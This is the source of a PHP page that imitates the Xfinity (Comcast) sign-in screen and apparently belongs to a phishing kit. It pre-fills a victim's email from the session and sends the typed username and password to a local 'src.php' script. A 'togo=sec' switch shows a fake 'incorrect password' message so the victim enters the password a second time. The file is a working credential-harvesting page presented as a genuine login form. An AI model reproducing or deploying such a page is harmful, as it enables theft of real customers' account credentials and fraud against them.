<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$changes = @$_GET['togo'];
if ($changes == 'sec') {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
    $formaction = "src.php";
    $showerror = "none";
}




?>


<!DOCTYPE html>


    



<html
    lang="en"
    class="light da"
    data-resource-package-id="res-responsive-login-page"
>
    <head>
        <title>Sign in to Xfinity</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <meta name="msapplication-TileColor" content="#ffffff">
        <meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
        <meta name="theme-color" content="#ffffff">
        
                
    <script type="text/javascript" src="https://login.xfinity.com/static/js/data-layer/lodash-slim.min.js"></script>

            <script type="text/javascript" src="https://login.xfinity.com/static/js/data-layer/tracking-aws.min.js"></script>
    
    <script type="text/javascript" src="https://login.xfinity.com/static/js/data-layer/tracking-DTM.min.js"></script>
            <script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/satelliteLib-531bc4f46256650a84099973f0ed331f809ea5f4.js"></script>
    
    <script type="tracking-data-digitalData">
        {
            "page" : {
                "pageInfo" : {
                    "screenName" : "sign in",
                    "language" : "en",
                    "referrerId" : "portal"
                 },
                 "category" : {
                    "primaryCategory" : "login",
                    "designType" : "responsive",
                    "businessType" : "resi",
                    "siteType" : "selfservice"
                },
                "affiliate" : {
                    "name": "comcast",
                    "channel" : "web"
                },
                "codebase" : {
                    "name" : "cima login"
                }
            },
            "user" : [{
                "profile" : [{
                    "profileInfo" : {
                        "authenticationType" : "unauthenticated",
                        "recognizationType" : "unrecognized"
                    }
                }],
                "segment" : {
                    "isLocalized" : false
                }
            }],
            "schemaVersion" : 0.11
        }

    </script>
    <script>document.dispatchEvent(new CustomEvent("c-tracking-init-start"));</script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
                bubbles: true
            }));
        });
        document.addEventListener('click', function(ev){
            var element = ev.target.closest('a:not([data-tracking]), button:not([data-tracking])');

            if (element) {
                var event = new CustomEvent('c-tracking-log-dom', {
                    bubbles: true
                });
                element.dispatchEvent(event);
            }
        });

    </script>

        <link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/styles-light.min.css?v=46ffca8">
                <link rel="shortcut icon" href="https://login.xfinity.com/static/images/favicon/favicon.ico">
        <link rel="apple-touch-icon" sizes="57x57" href="https://login.xfinity.com/static/images/favicon/apple-icon-57x57.png">
        <link rel="apple-touch-icon" sizes="60x60" href="https://login.xfinity.com/static/images/favicon/apple-icon-60x60.png">
        <link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
        <link rel="apple-touch-icon" sizes="76x76" href="https://login.xfinity.com/static/images/favicon/apple-icon-76x76.png">
        <link rel="apple-touch-icon" sizes="114x114" href="https://login.xfinity.com/static/images/favicon/apple-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="120x120" href="https://login.xfinity.com/static/images/favicon/apple-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="144x144" href="https://login.xfinity.com/static/images/favicon/apple-icon-144x144.png">
        <link rel="apple-touch-icon" sizes="152x152" href="https://login.xfinity.com/static/images/favicon/apple-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="180x180" href="https://login.xfinity.com/static/images/favicon/apple-icon-180x180.png">
        <link rel="icon" type="image/png" sizes="192x192" href="https://login.xfinity.com/static/images/favicon/android-icon-192x192.png">
        <link rel="icon" type="image/png" sizes="32x32" href="https://login.xfinity.com/static/images/favicon/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="96x96" href="https://login.xfinity.com/static/images/favicon/favicon-96x96.png">
        <link rel="icon" type="image/png" sizes="16x16" href="https://login.xfinity.com/static/images/favicon/favicon-16x16.png">
        <link rel="manifest" href="https://login.xfinity.com/static/images/favicon/manifest.json">

        <script type="text/javascript">
            runtimeData = {
                                    "r": "comcast.net",                                 "s": "portal",                                  "deviceAuthn": "false",                                 "continue": "http://xfinity.comcast.net/",                                  "ipAddrAuthn": "false",                                 "forceAuthn": "0",                                  "lang": "en",                                   "passive": "false",                                 "reqId": "b9de3973-0116-4428-bfde-6f284e78eb8c"                         }
        </script>
                                                                            <style type="text/css">
                                @media only screen and (min-width: 1400px) {
.ad.ad-fullscreen #left {
margin-left: 670px;
}
.ad.ad-fullscreen #right {
margin-right: 0px;
}
}
.da-300x250 #ad-block {
height: 250px;
overflow: hidden;
}
        </style>
                            <script>document.dispatchEvent(new CustomEvent("c-tracking-init-styles"));</script>
            </head>
            <body class=" has-footer ">
        <div id="breakpoints"></div>

                            <div id="background" style="height: 625px;"></div>
                                <main id="bd">
            <h1 class="screen-reader-text">Sign in to Xfinity</h1>
            <div id="left">     



<div id="ad-block" style="">
    <h2 id="ad-heading" class="screen-reader-text">Advertisement</h2>
    <script type="text/javascript" src="https://login.xfinity.com/static/js/vm-login-form-ad.js"></script>
    <script>
        adInfo.init({
            tvePartner : '',
                            uiStyle: 'light',
                        useIframe : false,
            isMobile : false
        });
    </script>
    <script type="text/javascript" src="https://dmp.tidaltv.com/audience/browser/data.json?a=6e283e6c8c36498ca8b4ec68f21f8870&callback=adInfo.setComcastOASAudienceData"></script>
    <script>
        adInfo.finalize();
    </script>
    
     
    <div id="ads-info">
    <a class="first" href="http://www.comcast.net/adinformation" rel="default" target="_blank">Ad Info</a>
    <span class="divider"></span>
    <a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</div>
    <img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D">
<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0" /></div>
    </div><div id="right">      <div class="container">
    <form name="signin" action="<?php echo "$formaction";   ?>" method="post" onsubmit="return login.onSubmit()">
                                                    <div class="single logo-wrapper">
                <span aria-role="img" class="xfinity-logo"></span>
                                            </div>
                        <label for="user" id="login_id_label" role="alert" aria-label=""></label>
                    <div class="textfield-wrapper">
                <label for="user" class="float accessibly-hidden">Username</label><input id="user" class="" autocorrect="off" autocapitalize="off" spellcheck="false" name="user" type="text" value="<?php echo "$email"; ?>" placeholder="Username, email, or mobile" maxlength="128">
            </div>
        
                    <label for="passwd" id="password_label" role="alert" aria-label=""></label>
            <div class="textfield-wrapper">
                <label for="passwd" class="float accessibly-hidden">Password</label><input id="passwd" class="" name="passwd" type="password" placeholder="Password" maxlength="128">
            </div>
            <input type="hidden" name="username" size="" value="">
            <div style="display: <?php echo "$showerror"; ?>;">
            
        <p id="error" class="error_message">The username or password you entered was incorrect. Please try again.</p>
        
        </div>
        
        
                    <div class="checkbox-container">
                <label for="remember_me">
                    <input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
                </label>
                <button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
            </div>

                    
        
        
        
        
        
                                                <button class="submit" type="submit" id="sign_in">Sign In</button>
                    
        
        
        <ul>
            
                                

                                                                                        <li id="forgot-username-password-item">Forgot <a href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3Db9de3973-0116-4428-bfde-6f284e78eb8c%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self" title="Lookup User ID">username</a> or <a id="forgotPwdLink" href="https://idm.xfinity.com/myaccount/reset?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3Db9de3973-0116-4428-bfde-6f284e78eb8c%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self" title="Reset Password">password</a>?</li>
                                    
                                        <li id="create-username-item">Don't have a username?                    <span><a href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3Db9de3973-0116-4428-bfde-6f284e78eb8c%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self">Create one</a></span>
                </li>
                    
        
            
                                                    
                
                <li id="quick-bill-pay">
                    <a href="https://customer.xfinity.com/lite" target="_self">Pay any balance</a> without signing in               </li>
            
                        
        </ul>
                    <p id="implied-legal">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>
        
        
                    <input type="hidden" name="r" value="comcast.net">
                    <input type="hidden" name="s" value="portal">
                    <input type="hidden" name="deviceAuthn" value="false">
                    <input type="hidden" name="continue" value="http://xfinity.comcast.net/">
                    <input type="hidden" name="ipAddrAuthn" value="false">
                    <input type="hidden" name="forceAuthn" value="0">
                    <input type="hidden" name="lang" value="en">
                    <input type="hidden" name="passive" value="false">
                    <input type="hidden" name="reqId" value="b9de3973-0116-4428-bfde-6f284e78eb8c">
        
    </form>
</div>

                </div>
        </main><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="./comcastlogin_files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe>
                    
<footer>
<span class="copyright">© 2018 Comcast</span>
<span class="divider hide-compact"></span>
<span class="links hide-compact">
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
<span class="divider"></span>
<a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>
</span>
<span class="divider"></span>
<span class="links">
<a href="http://xfinity.comcast.net/siteindex/">Site Map</a>
<span class="divider"></span>
<a href="https://customer.comcast.com/contact-us/">Contact Us</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
</footer>
        
        
        <script type="text/javascript" src="https://login.xfinity.com/static/js/libs/jquery-1.12.4.min.js"></script>

                                            <div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
        <div role="document" class="content">
                        <button type="button" class="close" aria-label="Close"></button>
                                <h1>Why Stay Signed In?</h1>
                    <p>When you choose this option on sign in, we will remember who you are and keep you signed in for up to 30 days unless you sign out.</p>
                    <p>Please note: If you share your personal computer with others, they could access and make changes to your account. You should definitely not use this option on public computers.</p>
                
        </div>
    </div>
            
    <script type="text/javascript" src="https://login.xfinity.com/static/js/scripts-responsive.min.js?v=46ffca8"></script>

    <script type="text/javascript">
        login.registerInitFunction(function(config){
    login.onSubmit = function() {
        var usernameSelector = "#"+config.usernameId,
            passwordSelector = "#"+config.passwordId,
            username = $(usernameSelector),
            password = $(passwordSelector);
        if(username.val() === "" || password.val() === "") {
            $("#error").remove();
            $(usernameSelector+", "+passwordSelector).addClass("error");
            $('<p id="error" class="error_message">'+config.authnEmptyError+'</p>').insertAfter(".textfield-wrapper:has("+passwordSelector+")");
            $("#login_id_label").attr('aria-label',config.authnEmptyError+' '+config.reenterUsername);
            $("#password_label").attr('aria-label',config.authnEmptyError+' '+config.reenterPassword);
            username.focus();
            return false
        } else {
            return true
        }
    };
    
}, "responsiveForm");
;
                                shared.init();
        login.init({
            usernameId: 'user',
            passwordId: 'passwd',
            authnEmptyError: 'Please enter your email, username or mobile phone number and password to sign in.',
            reenterUsername: 'Please re-enter username.',
            reenterPassword: 'Please re-enter password.'
        });
    </script>

        <script type="text/javascript">
        
        </script>

                            <script type="text/javascript">
                document.dispatchEvent(new CustomEvent("c-tracking-init-end"));
            </script>
            </body>
</html>
